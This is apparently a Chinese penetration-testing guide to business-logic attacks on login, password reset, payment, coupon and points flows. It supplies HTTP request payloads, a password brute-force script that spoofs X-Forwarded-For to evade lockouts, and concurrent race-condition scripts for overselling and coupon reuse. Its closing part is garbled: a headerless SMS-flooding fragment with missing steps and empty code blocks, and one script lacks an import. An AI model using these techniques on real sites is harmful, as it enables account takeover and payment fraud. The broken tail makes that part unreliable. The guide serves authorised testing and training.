## [g-authflow] 注册登录逻辑——认证流程的每一步都可能被绕

### [a-verify-bypass] 邮箱/手机验证绕过 | medium | 验证码绕过;认证逻辑 | 验证码不校验
> 验证码校验不严：不校验、可爆破、回显响应、或校验与使用分离。

#### 这个条目的作用
把"验证码"当成一道门，本条目教你系统检查这道门是不是虚掩的：服务端到底比不比对这个 code？比对错了怎么办？比对完还有没有后续防线？六种常见缺陷——不校验、万能码、不失效、响应回显、空值绕过、校验与使用分离——任意命中一种，就能在不知道真实验证码的情况下完成注册、改密、绑手机等敏感操作。这是认证类靶场出镜率最高的点，也是现实中社工库撞库的前置。

#### 前置条件
- 已注册/可注册一个普通测试账号（或靶场提供测试手机号）
- Burp Suite（或任意抓包工具）能拦截并重放请求
- 目标存在至少一个"发送验证码 + 提交验证码"的功能：注册、找回密码、绑定手机、改绑定、注销账号
- 手机号/邮箱可控：能收到验证码（用于确认正常流程），或靶场直接回显验证码

#### 第 1 步：抓正常流程，拆出两个接口
先用真实手机号走一遍完整流程，抓两个关键请求：**发送验证码接口**（如 `POST /api/sms/send`）和**提交验证码接口**（如 `POST /api/register`、`POST /api/verify`）。记录后者的完整参数，尤其 `code`、`phone`、`scene` 字段名和请求头。

```http
POST /api/sms/send HTTP/1.1
Host: target.com
Content-Type: application/json

{"phone": "13800000000", "scene": "register"}
```

```http
POST /api/register HTTP/1.1
Host: target.com
Content-Type: application/json

{"phone": "13800000000", "code": "123456", "password": "Test@12345"}
```

> [!tip] 拿到真实验证码先正常注册成功一次，确认基线，后续所有绕过测试都在这个基线上对比响应差异。

#### 第 2 步：测"不校验"与"万能码"
用同一个手机号重新发送验证码（**不要看短信内容**），然后盲提交几组固定值。服务端常见两种写法：`if (code == input)` 直接比（随机数不校验就是摆设）、`if (input in ["000000","123456"])` 特判万能码。

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"phone": "13800000000", "code": "000000", "password": "Test@12345"}
```

依次尝试 `000000`、`123456`、`888888`、`999999`、`0`、`111111`。预期结果：正常情况返回"验证码错误"；若返回注册成功（新账号能登录），即命中"不校验"或"万能码"。

> [!warn] 若某个固定值注册成功了，记录证据后停止，不要用这个漏洞批量注册账号刷数据。

#### 第 3 步：测"空值绕过"
删除 `code` 字段、传空字符串、传 `null`、传数组，共四组变体，分别重放提交接口。有些后端只写 `if (code)` 判断"字段存在"，空值反而通过；还有些框架把 `code=[]` 解析成 falsy。

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"phone": "13800000000", "password": "Test@12345"}   # 无 code 字段
```

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"phone": "13800000000", "code": null, "password": "Test@12345"}
```

预期结果：正常情况报"验证码不能为空"；若直接注册成功，即空值绕过。

#### 第 4 步：测"回显在响应"
重新发送验证码，但这次仔细看**发送接口的响应体、响应头、Set-Cookie、以及前端 JS**。常见低级实现：`{"code": "123456", "success": true}` 直接回给前端；或验证码写进 Set-Cookie；或存在一个调试接口 `GET /api/sms/code?phone=xxx`。

```http
POST /api/sms/send HTTP/1.1
Content-Type: application/json

{"phone": "13800000000", "scene": "register"}
```

预期结果：响应体里出现 4-6 位数字、或 Set-Cookie 里 `sms_code=123456`、或同域存在可直接读出验证码的接口。命中后拿着回显的 code 直接提交。

> [!tip] 回显的验证码经常带过期时间字段（如 `expireAt`），看服务端是否真的校验过期，不校验就无限期可用。

#### 第 5 步：测"不失效"（复用）
用同一个验证码，在**首次使用成功后**（或故意用错一次后再用对）再次提交。很多实现只在"发送时"生成验证码、从不在"使用时"标记已用，导致同一 code 可反复用，配合"校验接口与注册接口分离"杀伤力更大。

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"phone": "13800000001", "code": "123456", "password": "Test@12345"}   # 换手机号，用同一 code
```

预期结果：正常情况"验证码错误/已使用"；若第二个手机号也能注册成功，说明验证码不绑定手机号且不失效。

#### 第 6 步：测"校验与使用分离"
先正常调用发送验证码接口，拿到真实 code；再找一找是否存在单独的校验接口（如 `POST /api/verify`）和单独的注册接口（`POST /api/register`）。如果注册接口**自己不再校验**，那攻击链就是"跳过校验接口，直接把 code 填对或填空调注册"。

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"phone": "13800000000", "code": "", "password": "Test@12345"}
```

预期结果：注册成功。这种场景下甚至可以完全绕过验证码流程，直接构造注册请求。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 盲试固定值总是"验证码错误" | 服务端确实随机校验，或场景参数（scene）不对 | 先看发送接口是否要求 `scene`，用正确场景重发再测；固定值测试不是唯一手段 |
| 改参数后手机号被锁定/发送频繁 | 发送接口有频控，把提交接口也一起限制了 | 换测试手机号、换 IP（XFF）、或改用靶场提供的多号码 |
| 提交接口 500 报错 | 删字段导致后端 NPE，不是绕过 | 500 也算"服务端没兜底"，但优先把空值/固定值测完再看 |
| 测"不失效"时误用他人验证码 | 复用了真实手机号的 code | 复用测试只用自己控制的号码，避免影响真实用户 |
| 明明回显了 code 却提交失败 | 验证码绑定手机号或已过期 | 用回显的 code + 同一手机号在短时间内提交 |

#### 实战要点
- 测试顺序固定为：**空值 → 固定值 → 复用 → 分离校验 → 回显**，每步都有独立证据，别混在一起
- 所有变体测试统一用同一手机号，方便对比"发送成功/注册成功"的响应差异
- 回显漏洞要连响应头一起看：`Set-Cookie`、`X-Code`、`debug` 字段都别放过
- 若同时存在"发送频控"，绕过方式看 `c-sms-bomb` 条目的 XFF 与参数变体手法
- 找到"校验与使用分离"时，画一条攻击链：发送→跳过校验→直接注册，报告里写清哪步缺校验
- 记录每个变体的原始响应截图/文本，报告需要"同一手机号、不同 payload、不同结果"的对照表

### [a-login-reset] 登录限制与密码重置链 | medium | 爆破防护;密码重置 | 登录爆破绕过
> 登录次数限制可绕过；密码重置流程存在验证码/回显/竞态缺陷。

#### 这个条目的作用
本条目覆盖两条攻击线：一是**登录爆破的限速绕过**——后端按 IP 或按账号计数，伪造 XFF、大小写变体、多接口分散请求就能让计数器失效，从而对弱口令做字典爆破；二是**密码重置链**——重置流程每个环节（验证码回显、参数污染、校验与更新分离、响应差异）都可能被单独攻破，最终拿到任意账号的重置权。两条线组合起来，就是从"只能试密码"升级到"直接重置目标密码"的完整路径。

#### 前置条件
- 一个自己可控的测试账号（先拿自己账号验证限制机制，避免误锁他人）
- 目标存在登录接口与"忘记密码/重置密码"功能
- 能抓包重放，Burp 的 Intruder/Repeater 或脚本环境可用
- 了解目标限制机制：是锁 IP、锁账号、还是登录后出验证码（先手动错 5 次观察）

#### 第 1 步：摸清登录限制机制
手动用错误密码登录 5 次，观察：第几次出现"尝试次数过多"？提示是"账号已锁定"还是"请稍后再试"？锁定持续多久？错误达到阈值后是出验证码还是直接拒绝？这些决定了后面用哪种绕过。同时抓登录请求，确认提交格式（form 还是 JSON）。

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=test&password=wrongpass
```

预期结果：记录到阈值次数与锁定行为。若连试 20 次都不锁、不出验证码，说明根本没限制，直接进入第 2 步做字典爆破。

> [!warn] 先用自己的账号测。锁定机制若按账号计数，测完可能把自己账号锁了，先准备第二个测试账号兜底。

#### 第 2 步：绕过 IP 计数（XFF 伪造）
若限制是"同 IP 错误 N 次触发验证码/锁定"，则服务端计数大概率取 `X-Forwarded-For` 或 `X-Real-IP`（很多后端信任客户端头）。给每个爆破请求带一个随机 IP，计数器就永远到不了阈值。

```http
POST /api/login HTTP/1.1
Host: target.com
X-Forwarded-For: 10.0.0.1
X-Real-IP: 10.0.0.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrong1
```

预期结果：同一账号反复错 20+ 次都不触发锁定 → XFF 绕过成立。若仍被锁，说明计数基于 TCP 连接 IP（真实 IP），此路不通，转第 3 步。

> [!tip] 用 Burp Intruder 时把 `X-Forwarded-For: §1.2.3.4§` 设为 payload 位置，生成递增 IP 即可。

#### 第 3 步：用参数变体打散计数
若限制按账号计数且不认 XFF，试参数变体让"同一个账号"在服务端眼里是"多个账号"：用户名前后加空格、大小写互换、`admin` vs `Admin` vs `admin `、URL 编码 `%61dmin`。很多实现用 `username` 原文查库做计数 key，变体就绕开了。

```http
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin%20&password=wrong1     # 尾部空格
```

```http
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Admin&password=wrong1        # 大小写
```

预期结果：若登录成功判断又区分了大小写（`Admin` 能登录而 `admin` 也能登录同一账号），说明存在两套查询，计数被分散。

#### 第 4 步：字典爆破（确认限制可绕后）
限制确认可绕，用弱口令字典对目标账号爆破。4-6 位纯数字、`admin/123456`、`password`、生日、`test123` 等常见口令优先。用脚本循环 + 随机 XFF，命中即停。

```python
import requests
import random

url = "http://target/api/login"
with open("passwords.txt") as f:
    words = [w.strip() for w in f]

for pwd in words:
    ip = f"10.{(random.randint(1,254))}.{random.randint(1,254)}.{random.randint(1,254)}"
    r = requests.post(url, data={"username": "admin", "password": pwd},
                      headers={"X-Forwarded-For": ip}, timeout=5)
    if r.status_code == 200 and "success" in r.text:
        print(f"[HIT] {pwd}")
        break
    if "locked" in r.text.lower() or "验证码" in r.text:
        print("限制触发，停止:", pwd)
        break
```

预期结果：打印出命中口令即爆破成功。若中途触发验证码/锁定，回到第 2/3 步确认是否绕干净。

> [!warn] 爆破只对授权靶场/账号进行。真实目标的爆破可能触发账号锁定和风控告警，先评估后果再跑。

#### 第 5 步：密码重置链——验证码回显与参数污染
切到"忘记密码"流程。先看发送重置验证码接口的响应体/Set-Cookie 是否回显 code（同 a-verify-bypass 第 4 步）。再看重置提交接口：正常用自己的手机号取码，提交时把 `phone`/`username` 字段**改成目标账号**，验证码保留自己的——服务端若用"提交参数里的手机号"定位账号而不是用"验证码绑定的手机号"，就能用自己验证码重置他人密码。

```http
POST /api/reset-password HTTP/1.1
Content-Type: application/json

{"phone": "13900000001", "code": "123456", "newPassword": "Hacked@123"}   # code 是自己的，phone 是目标的
```

预期结果：重置成功且目标账号能用新密码登录 → 参数污染漏洞成立。若提示"验证码错误/手机号不匹配"，说明验证码与手机号绑定，此路不通。

#### 第 6 步：重置链——响应差异与校验/更新分离
最后两类：一是**响应差异**——分别对存在的账号和不存在的账号触发"发送验证码/重置"，对比提示文案（`该账号不存在` vs `验证码已发送`），差异即泄露账号存在性，可用于批量枚举。二是**校验与更新分离**——若存在独立的 `POST /api/reset/verify`（校验 code）与 `POST /api/reset/update`（改密码）两个接口，update 接口可能不校验 code，直接调用即可改任意账号密码。

```http
POST /api/reset/update HTTP/1.1
Content-Type: application/json

{"phone": "13900000001", "newPassword": "Hacked@123"}   # 跳过 verify 直接改密
```

预期结果：直接改密成功 → 任意账号密码重置漏洞，最高危。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 加 XFF 后仍被锁 | 计数基于真实 IP 或账号维度 | 改用参数变体打散账号计数；或确认锁定是"临时验证码"而非封禁 |
| 变体用户名登录成功但拿不到会话 | 服务端归一化用户名（trim/小写）后再登录 | 归一会让计数集中，改用"多接口分散"：登录、登录-2、验证码登录三个入口各试一部分字典 |
| 重置提示"验证码错误" | 验证码与手机号强绑定 | 放弃参数污染，改测响应差异和 update 接口是否独立 |
| 重置成功后原 session 仍有效 | 服务端不失效旧会话（这本身是缺陷） | 记录为独立发现：重置后旧 token 仍可访问 |
| 爆破到一半出现图形验证码 | 阈值后出图码，前面绕过无效 | 看 c-image-captcha 条目，先解决图码再继续 |

#### 实战要点
- 先花 5 分钟摸限制机制，再决定爆破方案：锁 IP → XFF；锁账号 → 参数变体；出图码 → 先解图码
- 爆破命中后保留"错误响应累计 + 命中响应"的对照，报告里要能证明不是撞运气
- 密码重置链的测试顺序：回显 → 参数污染 → 响应差异 → 分离接口，每步都是独立漏洞
- 重置成功后**必须验证新密码能登录**，并检查旧 session 是否失效（两个都是报告素材）
- 参数污染时永远用自己的验证码 + 目标的手机号，绝不要试图拦截他人验证码
- 所有账号存在性探测（响应差异）属于信息泄露类，单独记录，别和重置漏洞混在一个编号里

## [g-payment] 支付与订单——金额和状态都别信前端

### [p-amount-tamper] 金额与数量篡改 | medium | 金额篡改;支付逻辑 | 0 元购
> 订单金额由前端提交且服务端不重新计算，篡改金额/数量即低价购买。

#### 这个条目的作用
支付系统的铁律是"**金额由服务端计算，前端只传商品 ID 和数量**"。本条目教你把这条铁律反过来验证：订单创建、购物车结算、支付回调三个环节里，凡是前端能传的金额类字段（`price`/`total`/`amount`/`discount`/`quantity`），都逐一篡改成 0、负数、极小值，看服务端是否重新计算。命中即"0 元购"或"负数退款"，是支付类靶场的核心考点。

#### 前置条件
- 一个可下单的测试账号，账户内有少量余额（或靶场提供虚拟支付）
- 商品存在，且知道单价（页面/接口能读到）
- Burp 能拦截下单与支付回调请求
- 理解"正常下单"的完整请求链：加购 → 结算 → 创建订单 → 支付 → 回调

#### 第 1 步：正常下单抓全链路
用正常流程买一件便宜商品，抓下**创建订单**和**支付/回调**两个关键请求。记录创建订单请求里所有字段，特别是价格相关：`price`、`total`、`amount`、`discount`、`couponAmount`、`isFree`、`quantity`。同时记下服务端返回的订单金额，作为篡改后的对比基线。

```http
POST /api/order/create HTTP/1.1
Host: target.com
Content-Type: application/json

{"itemId": 1001, "quantity": 1, "price": 99.00, "total": 99.00}
```

预期结果：生成订单，订单金额 = 商品单价 × 数量（99.00）。若请求体里根本没有价格字段（服务端查库定价），则该接口本身没暴露篡改面，转第 4 步看其他环节。

> [!tip] 前端传的价格字段名千奇百怪：`price`、`unitPrice`、`goodsPrice`、`totalPrice`、`payAmount`、`finalPrice`。全抓下来逐一试。

#### 第 2 步：篡改金额为 0 与极小值
把 `price` 和 `total` 改成 `0`，下单看是否成功、支付金额是否为 0。若 0 被拦截（如校验 `> 0`），再试极小值：`0.01` → `0.001`、`1e-10`、`0.0000000001`。很多后端用浮点比较或精度截断，极小值会被当成 0 或精度丢失。

```http
POST /api/order/create HTTP/1.1
Content-Type: application/json

{"itemId": 1001, "quantity": 1, "price": 0, "total": 0}
```

```http
POST /api/order/create HTTP/1.1
Content-Type: application/json

{"itemId": 1001, "quantity": 1, "price": 0.001, "total": 0.001}
```

预期结果：订单创建成功且应付金额为 0/0.001 → 篡改成立。若返回"金额不合法"，说明有下限校验，继续试负数和其他字段。

> [!warn] 篡改成功后**不要真的把 0 元订单支付掉**（尤其真实环境），记录"订单已生成 + 应付金额为 0"即可作为证据。

#### 第 3 步：篡改数量为负数与隐藏字段
数量改负：`quantity=-1`。部分实现的总额公式是 `price * quantity`，负数数量会让总额变负，配合"余额足够就支付"可能产生负数扣款（账户余额增加）。再试隐藏字段：往 body 里塞 `discount`、`couponAmount`、`isFree`、`vipDiscount` 等字段，直接置 0 或 `true`——服务端若用前端传值覆盖自己的优惠计算，就白嫖优惠。

```http
POST /api/order/create HTTP/1.1
Content-Type: application/json

{"itemId": 1001, "quantity": -1, "price": 99.00, "total": -99.00}
```

```http
POST /api/order/create HTTP/1.1
Content-Type: application/json

{"itemId": 1001, "quantity": 1, "price": 99.00, "total": 99.00, "discount": 99.00, "isFree": true}
```

预期结果：数量为负时订单总额为负、或库存逻辑异常；塞入 `isFree:true` 后应付金额变 0。两者任一成立即漏洞。

#### 第 4 步：测支付回调是否重新校验
有些系统下单时不校验，但在**支付平台回调**时按回调金额入账。抓支付成功后的回调请求（`POST /api/pay/callback`，通常带 `orderId`、`amount`、`sign`），尝试：把 `amount` 改小/改 0 重放；或对一笔已支付订单重复发送回调（重放）。若服务端不校验金额与订单应付款的一致性、不校验签名、不校验订单状态，就能反复入账或 0 元入账。

```http
POST /api/pay/callback HTTP/1.1
Content-Type: application/json

{"orderId": "20240101001", "amount": 0.01, "status": "success", "sign": "..."}
```

预期结果：订单状态被置为已支付、余额按 0.01 入账 → 回调未校验。若返回"签名错误/金额不符"，说明有签名与金额校验，此路不通。

> [!tip] 回调重放属于 r-duplicate 条目范畴，本条目重点是"回调金额是否重新校验"。两者一起测，命中哪个报哪个。

#### 第 5 步：测越权改价接口
找找有没有独立的改价入口：购物车修改价格、订单改价、后台促销设置、优惠计算接口。这些接口若未鉴权或只校验登录，就能先改价再下单，实现"正常价格下单、改价接口把订单金额压到 0"。

```http
POST /api/cart/update HTTP/1.1
Content-Type: application/json

{"itemId": 1001, "price": 0.01}
```

预期结果：购物车/订单价格被修改，后续下单金额 0.01 → 改价接口越权。若返回 403/无权限，记录后继续第 6 步。

#### 第 6 步：汇总判定
把每一步结果整理成对照表：字段名 | 篡改值 | 订单金额 | 是否成功。核心判定标准只有一条：**最终支付金额是否等于服务端按单价 × 数量重新计算的值**。任何"前端传多少就收多少"的字段都是漏洞。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 篡改后提示"价格不合法" | 服务端有下限校验（如必须 ≥ 0.01） | 改试极小值（1e-10）、负数、隐藏字段，校验常只挡明显值 |
| 改 `price` 无效，订单金额不变 | 服务端忽略前端 price，按商品表单价计算 | 说明该字段不可信输入，转测数量、折扣、回调环节 |
| 0 元订单生成但支付页金额正常 | 下单与支付拆成两套，支付时重新算价 | 抓支付创建请求（`/api/pay/create`），那里可能又传一遍金额 |
| 塞 `discount` 字段报 500 | 服务端把未知字段当错误 | 用已有字段名（抓包确认），别发明字段 |
| 回调重放后状态不变 | 回调有订单状态校验（已支付则忽略） | 改测"未支付订单直接回调"或不同金额重放 |

#### 实战要点
- 篡改面优先级：创建订单 body > 支付创建请求 > 回调 > 改价接口，四个环节都要看
- 每次篡改保留"正常值响应 + 篡改值响应"两条证据，报告需要对照
- 注意区分"前端展示金额"与"服务端结算金额"：页面显示 99 不代表结算用 99，一切以服务端订单数据为准
- 小数精度类漏洞重点看语言：PHP/JS 浮点、Python Decimal、Java BigDecimal 的处理差异，极小值专打精度截断
- 数量字段除了 `-1` 还可以试 `0`、超大值（整数溢出）、字符串 `"1"`、数组 `[1]`，看类型强转漏洞
- 命中 0 元购后别贪心多下单，保留最小证据集，危害说明里写清"可无限 0 元购买"

### [p-coupon-points] 优惠券复用与积分刷取 | medium | 优惠券;积分逻辑 | 薅羊毛
> 优惠券一次性校验缺失、积分发放可重放，造成重复薅取。

#### 这个条目的作用
优惠券和积分都是"一次性资产"，安全设计上必须做到**幂等**：一张券只能核销一次、一次签到只能得一次积分。本条目教你验证两类幂等缺失：优惠券侧（不标记已用、取消订单不还原、并发使用、券码可枚举）和积分侧（发放接口可重放、自己邀请自己、负数积分购买）。命中后能持续薅取折扣与积分，属于业务逻辑里最典型的"薅羊毛"漏洞。

#### 前置条件
- 账号内有至少一张可用优惠券、一个可签到/领积分的功能点
- 能抓包重放，能对同一请求重复发送
- 商品订单流程可用（下单时能选择优惠券）
- 积分余额可在用户中心查询（用于对比增减）

#### 第 1 步：建立积分/余额基线
下单前先记录：当前积分余额、优惠券状态（未使用）、账户余额。用一张优惠券正常下一单，成功后立刻再查：券状态是否变为"已使用"、积分是否变化。这一步确定"正常行为"的样子，后面所有异常测试都对比它。

```http
POST /api/order/create HTTP/1.1
Content-Type: application/json

{"itemId": 1001, "quantity": 1, "couponId": "COUPON-1001"}
```

预期结果：下单成功，优惠券状态变为已使用。若下单后券还是"未使用"，直接就是漏洞，跳第 3 步看是否可重复下单。

#### 第 2 步：测优惠券复用（同券重复下单）
用**同一张已核销的券**再次下单。服务端若只在前端标记"已使用"、或核销与订单创建分离，同一券码可以反复享受折扣。

```http
POST /api/order/create HTTP/1.1
Content-Type: application/json

{"itemId": 1001, "quantity": 1, "couponCode": "SAVE-2024-0001"}
```

预期结果：再次下单仍享受优惠 → 券未标记已用，可无限复用。若提示"优惠券已使用"，则转第 3 步测取消订单场景。

> [!tip] 券的传参两种常见形式：`couponId`（库内 ID）和 `couponCode`（券码）。两种都试，服务端可能只校验其中一种。

#### 第 3 步：测取消订单后的券状态
用一张券下单 → 取消订单 → 立即再用同一张券下单。缺陷有两种：一是取消订单不还原券状态（券被吞）；二是**还原逻辑有竞态/可重放**（取消接口可重复调用，每取消一次就"恢复"一张券，配合并发下单实现券复制）。

```http
POST /api/order/cancel HTTP/1.1
Content-Type: application/json

{"orderId": "20240101002"}
```

预期结果：取消后再下单：券仍可用（正常还原）→ 无漏洞；券不可用 → 吞券漏洞；重复调用取消接口后券能再次出现 → 还原逻辑缺陷。

#### 第 4 步：测并发使用（券的竞态）
用同一张券**同时**下两笔订单（并发 10 个请求）。典型缺陷：先查"券是否已用"再标记，并发请求都查到"未使用"，全部通过。用多线程脚本或 Burp Turbo Intruder 制造真实并发。

```python
import requests
import threading

url = "http://target/api/order/create"
body = {"itemId": 1001, "quantity": 1, "couponCode": "SAVE-2024-0001"}
s = requests.Session()
s.headers["Cookie"] = "session=YOUR_SESSION"

def go():
    try:
        r = s.post(url, json=body, timeout=5)
        print(r.status_code, r.text[:60])
    except Exception as e:
        print("ERR", e)

ths = [threading.Thread(target=go) for _ in range(10)]
for t in ths: t.start()
for t in ths: t.join()
```

预期结果：多个请求都返回下单成功且都享受优惠 → 并发复用成立（细节看 g-race 条目）。

> [!warn] 并发测试会真实创建多笔订单，先确认测试账号/靶场可承受，别把生产数据打乱。

#### 第 5 步：测积分刷取（重放与自邀）
找签到、邀请、评价、分享得积分等接口。先正常调用一次，记录积分增加；然后**完全相同的请求**重复发送 3-5 次，积分若每次都增加，即缺幂等。邀请场景专门测"自己邀请自己"：注册小号 A 邀请大号 B、B 再邀请 A，或同一设备/同 IP 反复触发邀请码。

```http
POST /api/sign-in HTTP/1.1
Content-Type: application/json

{"userId": 10001}
# 同一请求连续发 5 次，看积分是否 +5 次
```

```http
POST /api/invite/claim HTTP/1.1
Content-Type: application/json

{"inviteCode": "ABC123", "inviter": 10001}
```

预期结果：重复请求积分多次增加 → 重放刷积分；自邀成功且双方都得积分 → 邀请逻辑缺陷。

#### 第 6 步：测负数积分
积分商城/抵扣场景：购买时传 `points=-100` 或用负积分抵扣。若服务端不校验余额下限，积分可被扣成负数，负数余额在某些实现里还能继续抵扣（负负得正）。

```http
POST /api/points/exchange HTTP/1.1
Content-Type: application/json

{"itemId": 2001, "points": -100}
```

预期结果：兑换成功、积分余额变负 → 负数积分漏洞。正常情况应提示"积分不足"。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 同券重复下单被拒 | 服务端确实标记了已用 | 转测"取消订单还原"和"并发使用"，单点失败不代表整条线安全 |
| 取消后券消失 | 取消接口还原逻辑缺失（吞券） | 这本身是缺陷，记录；同时测重复调用取消接口 |
| 并发下单只有 1-2 个成功 | 有数据库唯一约束或行锁 | 说明该点有防护，换并发目标（积分、签到） |
| 重复签到积分只加一次 | 有今日已签标记 | 试"跨天边界"（改系统时间/等零点）或删除已签记录参数 |
| 自邀不成功 | 服务端校验了 IP/设备指纹 | 试换 IP（XFF）、换设备标识参数、或大小号交叉邀请 |

#### 实战要点
- 幂等测试三连：**同请求重放 3-5 次、取消后还原、并发 10 连**，覆盖缺幂等、还原缺陷、竞态三类
- 积分类漏洞记录要带"操作前余额 → 操作后余额"，数字对照最有说服力
- 邀请漏洞别只看积分，邀请码若可枚举（自增/可遍历）还能批量薅，一并记录
- 负数积分、负数余额都属于金额完整性缺陷，报告危害等级通常为高
- 所有测试用最小规模：1 张券、5 次重放、10 并发，够证明漏洞即可，别刷爆数据
- 优惠券复用常与"取消订单"“退款”联动，把下单-取消-退款整条链都测一遍

### [p-zero-cost] 并发 0 元购思路 | hard | 并发;支付逻辑 | 竞态薅羊毛
> 通过并发绕过库存/金额/状态校验，实现 0 元购或超卖。

#### 这个条目的作用
前面 p-amount-tamper 是"参数篡改"，本条目是"**时间篡改**"：利用"先查后写"的非原子逻辑，让多个并发请求同时通过校验。目标三类：库存（1 件商品并发 10 单全成功 → 超卖）、支付状态（同一订单重复支付/重复回调入账）、优惠券状态（并发核销同一张券）。它是竞态（g-race）在支付场景的具体应用，是 hard 级靶场的常客。

#### 前置条件
- 一个测试账号、至少一件"库存为 1"或"低价"的商品
- 能发起真实并发请求：Burp Turbo Intruder、自写多线程脚本（见 p-coupon-points 第 4 步模板）、或 race 专用工具
- 已理解正常下单-支付-回调的完整请求链（先跑通 p-amount-tamper 第 1 步）
- 注意：串行重放不算竞态证据，必须多连接同时到达

#### 第 1 步：找竞态目标（先单发建立基线）
先单发一次请求确认目标：创建一个订单（库存 1 的商品）、支付一笔订单、核销一张券，分别记录正常响应与数据变化（库存剩 0、订单状态待支付、券已使用）。把这些"状态变化点"记下来，后面并发就看它们是否被突破。

```http
POST /api/order/create HTTP/1.1
Content-Type: application/json

{"itemId": 3001, "quantity": 1}   # 该商品库存 = 1
```

预期结果：第一次下单成功、库存变 0；第二次下单应提示"库存不足"。这就是后续并发的对照组。

#### 第 2 步：并发抢库存（超卖）
把第 1 步的创建订单请求做成并发：10-50 个线程同时发送（用 p-coupon-points 第 4 步的多线程模板，把 body 换成下单请求）。关键在**同时到达**：用线程屏障或 Turbo Intruder 的 `concurrentConnections=10` 一次性打出去。

```python
# Turbo Intruder 模板（实际运行在 Burp 扩展里）
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           pipeline=False)
    for i in range(50):
        engine.queue(target.req, i)

def handleResponse(req, **kwargs):
    table.add(req)
```

预期结果：多个请求都返回"下单成功"，订单数 > 库存数 → 超卖成立。若只有一个成功、其余"库存不足"，说明扣库存是原子的（如 `UPDATE ... WHERE stock > 0`），换下一个目标。

> [!tip] 本地验证竞态别用 for 循环串行重放——那不是竞态。多线程里加一个 `barrier.wait()` 让所有请求同时发出，或直接用 Turbo Intruder。

#### 第 3 步：并发支付同一订单（重复入账）
创建一笔订单（保持待支付），然后并发发送支付请求/支付回调。若订单状态"待支付→已支付"的流转无锁、或回调不校验状态，多笔并发回调都会入账。

```http
POST /api/pay/callback HTTP/1.1
Content-Type: application/json

{"orderId": "20240101005", "amount": 99.00, "status": "success", "sign": "..."}
# 同一请求并发发 10 次
```

预期结果：余额被加了多次、或订单被支付多次 → 重复入账。若只有一次成功，转第 4 步。

#### 第 4 步：并发核销同一优惠券
在"核销"与"使用"之间的时间窗内并发下单：10 个请求同时带同一张券。服务端若先查"券未使用"再标记，并发全部通过。

```http
POST /api/order/create HTTP/1.1
Content-Type: application/json

{"itemId": 3001, "quantity": 1, "couponCode": "SAVE-2024-0001"}
# 并发 10 次，全部享受优惠即漏洞
```

预期结果：多笔订单都应用了同一张券的折扣 → 券并发复用。若只有一笔成功，说明券的标记是原子的。

#### 第 5 步：时间窗利用（改价+下单）
有些竞态不在"同一接口并发"，而在"两个接口之间的时间窗"：比如改价接口与下单接口之间、订单取消与优惠券还原之间。思路：先发改价请求，**不等待响应**立刻发下单请求，看下单是否读到了改价后的价格。用脚本在两个请求间插入极小延迟（0-200ms 递增），找到非原子窗口。

```python
import requests, time
s = requests.Session()
s.headers["Cookie"] = "session=YOUR_SESSION"

for delay in [0, 0.05, 0.1, 0.2, 0.5]:
    # 先改价，随即下单
    t = threading.Thread(target=lambda: s.post("http://target/api/cart/update",
                          json={"itemId": 3001, "price": 0.01}))
    t.start()
    time.sleep(delay)
    r = s.post("http://target/api/order/create", json={"itemId": 3001, "quantity": 1})
    print(f"delay={delay} order_amount={r.json().get('amount')}")
```

预期结果：某个延迟窗口下订单金额变成 0.01 → 时间窗竞态成立。

> [!warn] 时间窗窗口通常只有几十到几百毫秒，多轮尝试是正常的；失败不代表没洞，可能窗口更窄或逻辑本身原子。

#### 第 6 步：结果判定与证据整理
把所有并发测试结果整理：目标 | 并发数 | 成功数 | 数据不一致表现。判定标准：**多个并发请求都成功 + 数据出现不一致（超卖/重复入账/券多用）** = 竞态成立。单次成功是正常行为，多次才叫竞态。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 串行重放多次都成功，但并发全失败 | 服务端有幂等键（订单号/请求 ID 唯一约束） | 说明有防重放，改测"不同订单号"的并发，或换竞态目标 |
| 并发只有 1 个成功 | 数据库行锁或 `WHERE stock>0` 原子更新 | 该点有防护；试"先查后写"的其他目标（余额扣减、签到） |
| 10 并发请求一个都没到服务端 | 客户端连接数不够/被 WAF 限流 | 加大并发数（50-100）、降低每请求超时、分批打 |
| 订单创建成功但支付金额仍正常 | 竞态只在下单层，支付层重新算价 | 竞态命中下单层已算漏洞（超卖），支付金额另测 p-amount-tamper |
| 改价+下单窗口测不出 | 窗口太窄或改价被忽略 | 换"取消订单+还原优惠券"、"支付+退款"等其他双接口组合 |

#### 实战要点
- 竞态三要素：**真实并发、同时到达、数据不一致**。证据必须展示"多个请求都成功"


预期结果：收到短信。若发送前要求图形验证码，先看 c-image-captcha 条目解决图码再继续。

#### 第 2 步：测基本频率限制
对同一个手机号连续发送 5 次（间隔 1-2 秒），观察：第几次开始提示"发送频繁"？限制是"60 秒 1 条"还是"1 分钟 N 条"？限制按什么维度计（手机号/IP/设备）？若连发 10 次都不受限，直接确认无限制，跳到第 6 步。

若限制按 IP 计数（"同 IP 每分钟 N 条"），服务端多半信任 `X-Forwarded-For`/`X-Real-IP`。给请求带随机 IP 头，计数即失效。

```http

X-Real-IP: 10.0.0.1

{"phone": "13800000000", "scene": "register"}
```

预期结果：带上 XFF 后，被限制的手机号又能收到短信 → IP 计数绕过成立。

#### 第 4 步：绕过手机号去重（参数变体）
若限制按手机号计数（"同号 60 秒 1 条"），用参数变体让服务端"认不出"是同一个号：`+86` 前缀、`86`、`0` 前缀、首尾空格、`%2B86` URL 编码、`138 0000 0000` 带空格。部分实现用原始字符串查缓存/计数，变体即绕开。

```http

Content-Type: application/json

```

```http
POST /api/sms/send HTTP/1.1
Content-Type: application/json

{"phone": "138 0000 0000", "scene": "register"}    # 加空格
```

